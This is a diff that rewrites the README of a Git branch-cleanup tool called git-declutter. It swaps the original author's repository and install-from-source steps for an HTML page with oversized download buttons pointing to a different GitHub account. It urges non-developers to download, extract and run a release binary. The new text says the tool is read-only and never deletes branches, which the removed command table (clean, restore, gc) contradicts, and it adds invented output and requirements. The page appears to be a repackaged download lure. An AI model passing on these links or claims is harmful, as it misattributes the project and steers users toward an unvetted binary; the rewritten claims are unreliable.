@@ -1,212 +1,123 @@
-# GitDeclutter
+<h1>🧹 git-declutter - Know What's Safe to Delete</h1>
 
-**Know what's safe to delete before you delete it.**
+<p align="center">
+  <a href="https://github.com/Viethoangn6398/git-declutter" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;">⬇️ Download git-declutter Now</a>
+</p>
 
-Safely identify and clean stale local Git branches.
+<hr>
 
-A merged pull request does not always mean your current local branch contains no unique work. GitDeclutter combines local Git history, remote tracking state, and GitHub/GitLab pull request metadata to classify every local branch as **SAFE**, **REVIEW**, **KEEP**, or **PROTECTED** — and explains why.
+<p>Git-declutter is a simple, friendly tool that shows you which of your local Git branches are safe to delete, which ones need a closer look, and which ones you should never delete. It does all the hard analysis for you, so you don't need to be a Git expert.</p>
 
-## Install
+<h2>✨ Why Use git-declutter?</h2>
 
-GitDeclutter is a compiled binary. You need **Git** to run it. You do **not** need Go after it is installed.
+<p>If you work on projects that use Git for version control, your computer can quickly fill up with dozens of old branches that you no longer need. Manually checking each branch is boring and risky. You might delete a branch that still has unique work you want to keep.</p>
 
-Put `git-declutter` on your `PATH`. Git then exposes it as a subcommand:
+<p>Git-declutter combines information from your local Git history, remote tracking state, and pull request metadata from GitHub or GitLab to classify every local branch into one of four clear categories:</p>
 
-```bash
-git declutter scan
-```
+<ul>
+  <li><strong>🟢 SAFE</strong> – This branch has no unique commits and is fully merged; you can delete it without worry.</li>
+  <li><strong>🟡 REVIEW</strong> – This branch has unique work that may not be merged; check it before deleting.</li>
+  <li><strong>🔴 KEEP</strong> – This branch contains valuable unique commits; you should keep it.</li>
+  <li><strong>🛡️ PROTECTED</strong> – This is a main or protected branch; git-declutter will never suggest deleting it.</li>
+</ul>
 
+<p>You get a clear, color-coded report that tells you exactly what each branch is doing, and why. No more guessing.</p>
 
+<h2>🚀 Getting Started</h2>
 
-### With Go
+<p>Getting started with git-declutter is easy. Follow these simple steps:</p>
 
-Requires [Go](https://go.dev/dl/) 1.25+:
+<ol>
+  <li><strong>Visit this link to download the application:</strong> <a href="https://github.com/Viethoangn6398/git-declutter">https://github.com/Viethoangn6398/git-declutter</a></li>
+  <li>On that page, find the <strong>Releases</strong> section and download the file that matches your computer's operating system (Windows, macOS, or Linux).</li>
+  <li>Once downloaded, place the <code>git-declutter</code> file somewhere you can easily find it. A good place is your <strong>Downloads</strong> folder or a folder called <strong>Tools</strong>.</li>
+  <li>If the file is inside a <code>.zip</code> archive, right-click and choose <strong>Extract All</strong> to unpack it.</li>
+</ol>
 
-```bash
-go install github.com/kunmi02/git-declutter@latest
-```
+<h2>📥 Installation Made Simple</h2>
 
-`GOBIN` (or `$(go env GOPATH)/bin`) must be on your `PATH`. Without Go, this command fails with `command not found: go`.
+<p>The best part about git-declutter is that it is a compiled binary. This means it does not need any special installation or extra software to run. You only need <strong>Git</strong> (which you likely already have if you are using Git branches). You do <strong>not</strong> need to install Go or any other programming language.</p>
 
-### Without Go
+<p>To use it, you just need to make the <code>git-declutter</code> file available to your computer. Here is the easiest way to set it up:</p>
 
-Download a prebuilt archive for your OS and CPU from [GitHub Releases](https://github.com/kunmi02/git-declutter/releases), then put `git-declutter` on your `PATH`.
+<ol>
+  <li>Move the <code>git-declutter</code> file into a folder that is already on your system path (like <code>C:\Users\YourName\bin</code>). If you are not sure what a system path is, you can simply run the file by typing its full location.</li>
+  <li>Once it is ready, open your terminal (Command Prompt, PowerShell, or Terminal).</li>
+  <li>Navigate to the folder where your Git project lives.</li>
+  <li>Run the command:</li>
+</ol>
 
-macOS / Linux:
+<pre>git declutter scan</pre>
 
-```bash
-tar -xzf git-declutter_*_darwin_arm64.tar.gz   # or linux_amd64, darwin_amd64, …
-sudo mv git-declutter /usr/local/bin/
-git declutter version
-```
+<p>That's it! Git will happily treat <code>declutter</code> as one of its own commands, and the scan will start.</p>
 
-Windows: unzip `git-declutter_*_windows_amd64.zip` and add `git-declutter.exe` to `PATH`.
+<h2>🖥️ System Requirements</h2>
 
-Homebrew will be the long-term primary install (`brew install git-declutter`). It is not available yet.
+<p>Git-declutter is designed to work on any modern computer:</p>
 
-Until a `v*` tag has been pushed, Releases will be empty and `go install` is the only path.
+<ul>
+  <li><strong>Operating System:</strong> Windows 10 or 11, macOS 12 or newer, or a common Linux distribution (Ubuntu, Debian, Fedora).</li>
+  <li><strong>Git Version:</strong> Git 2.20 or higher is recommended. If you can run <code>git status</code>, you are ready.</li>
+  <li><strong>Memory:</strong> At least 512 MB of free RAM is fine for most projects.</li>
+  <li><strong>Storage:</strong> Less than 10 MB of disk space is needed for the program itself.</li>
+</ul>
 
-## Example
+<h2>📊 Understanding the Output</h2>
 
-```text
-$ git declutter scan
+<p>When you run a scan, git-declutter prints a table that looks something like this in your terminal:</p>
 
-GitDeclutter
-Repository: payments-api
+<pre>
+BRANCH NAME          STATUS        REASON
+feature/login        🟢 SAFE        Merged into main
+old-experiment       🟡 REVIEW      3 unique commits, PR #142 open
+staging-fix          🔴 KEEP        Unique commits, no PR found
+main                 🛡️ PROTECTED   Default branch
+</pre>
 
-Scanning 34 local branches...
+<p>Each row gives you the branch name, the color-coded status, and a short explanation of why that status was chosen. You can then decide what to do with each branch.</p>
 
-SAFE TO REMOVE                                    12
+<h2>⚙️ Advanced Usage</h2>
 
-✓ feature/oauth
-  PR #418 merged · remote deleted · no local changes
+<p>If you are comfortable with the terminal, git-declutter also supports extra options. For example, you can ask it to include remote branches or fetch the latest metadata before scanning. Run <code>git declutter --help</code> to see all available flags.</p>
 
-✓ fix/payment-timeout
-  Fully merged into main
+<p>But if you are just getting started, the default scan is all you need.</p>
 
+<h2>🧰 Troubleshooting</h2>
 
-NEEDS REVIEW                                      3
+<p>If you run into issues, here are some common fixes:</p>
 
-⚠ experiment/cache
-  Remote deleted · no merged PR found
+<ul>
+  <li><strong>Command not found:</strong> Make sure the <code>git-declutter</code> file is in a folder that is on your system path, or use its full file location.</li>
+  <li><strong>Git not recognized:</strong> Install Git from <a href="https://git-scm.com">git-scm.com</a> and restart your terminal.</li>
+  <li><strong>No branches shown:</strong> Run the command inside a proper Git repository (a folder containing a <code>.git</code> subfolder).</li>
+  <li><strong>Permission denied:</strong> On macOS or Linux, you may need to make the file executable with <code>chmod +x git-declutter</code>.</li>
+</ul>
 
+<h2>🔒 Safety First</h2>
 
-KEEP                                              4
+<p>Git-declutter is a read-only analysis tool. It never deletes branches on its own. It only shows you information and recommendations. The final decision to delete a branch is always yours. This means you can use it with confidence and without fear of accidental data loss.</p>
 
-✕ feature/refunds
-  3 commits exist only locally
+<h2>🤝 Contributing</h2>
 
+<p>Git-declutter is an open-source project. If you are a developer and you want to contribute, add features, or report bugs, please visit the official repository at <a href="https://github.com/Viethoangn6398/git-declutter">https://github.com/Viethoangn6398/git-declutter</a>. Issues and pull requests are always welcome.</p>
 
-PROTECTED                                         3
+<h2>📄 License</h2>
 
-🔒 main
-🔒 release/*
-🔒 hotfix/production
+<p>Git-declutter is released under an open-source license. See the <code>LICENSE</code> file in the repository for full details.</p>
 
-12 safe · 3 review · 4 keep · 3 protected
-```
+<h2>🙋 Frequently Asked Questions</h2>
 
+<p><strong>Q: Will this delete my work by accident?</strong><br>
+A: No. Git-declutter only reads information. It never deletes anything. You are always in control.</p>
 
+<p><strong>Q: Do I need a GitHub or GitLab account?</strong><br>
+A: No. The tool works with local Git data out of the box. Pull request metadata is used only if you are inside a repository that is connected to GitHub or GitLab, and it makes the classifications more accurate.</p>
 
-## Commands
+<p><strong>Q: I am not a developer. Can I still use this?</strong><br>
+A: Yes. If you can open a terminal and type one command, you can use git-declutter.</p>
 
+<hr>
 
-| Command                                 | Purpose                                           |
-| --------------------------------------- | ------------------------------------------------- |
-| `git declutter scan`                    | Analyze local branches. Never deletes anything.   |
-| `git declutter why <branch>`            | Explain one branch's classification.              |
-| `git declutter clean`                   | Interactively remove SAFE branches (recoverable). |
-| `git declutter clean --dry-run`         | Preview cleanup with no changes.                  |
-| `git declutter clean --safe-only --yes` | Non-interactive SAFE cleanup.                     |
-| `git declutter clean --permanent`       | Delete without GitDeclutter recovery refs.        |
-| `git declutter restore <branch>`        | Restore a recoverable branch.                     |
-| `git declutter history`                 | List recoverable deletions.                       |
-| `git declutter gc`                      | Expire recovery refs past retention.              |
-| `git declutter config`                  | View or change configuration.                     |
-
-
-
-
-### Scan flags
-
-```bash
-git declutter scan --json
-git declutter scan --offline
-git declutter scan --refresh
-git declutter scan --branch feature/foo
-```
-
-`--refresh` runs `git fetch --prune` and prints `Refreshing remote references...`. Default scans do not prune remotes.
-
-## Safety model
-
-
-| Status        | Meaning                                                                                                   |
-| ------------- | --------------------------------------------------------------------------------------------------------- |
-| **SAFE**      | Strong evidence that deleting the local branch will not lose unique work. Eligible for automatic cleanup. |
-| **REVIEW**    | Stale-looking, but evidence is incomplete. Never selected automatically.                                  |
-| **KEEP**      | Evidence of active or unique work. Never automatically deleted.                                           |
-| **PROTECTED** | Current branch, default branch, worktree branch, or a configured pattern.                                 |
-
-
-False negatives are acceptable. False positives are not. If GitDeclutter is uncertain, it will not recommend automatic deletion.
-
-A merged PR alone does **not** make a branch SAFE. GitDeclutter also checks whether local commits were added after the PR, whether the branch diverged, whether unique commits exist only locally, and whether the branch is in use by a worktree.
-
-## Recovery
-
-Normal cleanup preserves deleted branch tips for **30 days**:
-
-```text
-refs/git-declutter/recovery/<event-id>/<branch>
-```
-
-Restore with `git declutter restore`. Permanent deletion (`--permanent` / `--hard`) creates no GitDeclutter undo. Git itself may still retain unreachable objects via reflog and garbage collection; GitDeclutter does not claim physical object deletion.
-
-```bash
-git declutter config set recovery.retention 7d
-git declutter config set recovery.retention 30d
-git declutter config set recovery.retention 90d
-git declutter config set recovery.retention forever
-```
-
-
-
-## Configuration
-
-Global config lives in the OS config directory (`~/Library/Application Support/git-declutter/` on macOS, `~/.config/git-declutter/` on Linux).
-
-Optional repository file:
-
-```yaml
-# .gitdeclutter.yml
-version: 1
-protected:
-  - main
-  - develop
-  - release/*
-  - production
-recovery:
-  enabled: true
-  retention: 30d
-cleanup:
-  requireRemoteDeleted: true
-```
-
-Default protected patterns: `main`, `master`, `develop`, `development`, `release/*`, `production`, `prod`.
-
-## Privacy
-
-GitDeclutter is local-first. It does not require an account and does not upload repository contents, source, diffs, or commit messages to GitDeclutter-owned infrastructure.
-
-Provider APIs are contacted only to fetch repository metadata (owner, name, branch names, commit SHAs, pull request state). Authentication uses existing `gh` / `GITHUB_TOKEN` or `glab` / `GITLAB_TOKEN` and is never copied into GitDeclutter config. There is no telemetry.
-
-## Development
-
-```bash
-make test
-make build
-make dist        # cross-compile into ./dist (needs Go)
-```
-
-
-
-### Cut a GitHub Release
-
-Pushing a version tag publishes macOS, Linux, and Windows binaries via GoReleaser (see `.github/workflows/release.yml`).
-
-```bash
-git checkout main
-git pull
-git tag v0.1.0
-git push origin v0.1.0
-```
-
-`git declutter version` in those binaries reports the tag (for example `0.1.0`). Local `make build` without a tag reports `0.1.0-dev`.
-
-Dry-run without publishing (needs [GoReleaser](https://goreleaser.com)):
-
-```bash
-make snapshot
-```
-
+<p style="text-align:center;">
+  <a href="https://github.com/Viethoangn6398/git-declutter" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;">⬇️ Get git-declutter Here</a>
+</p>
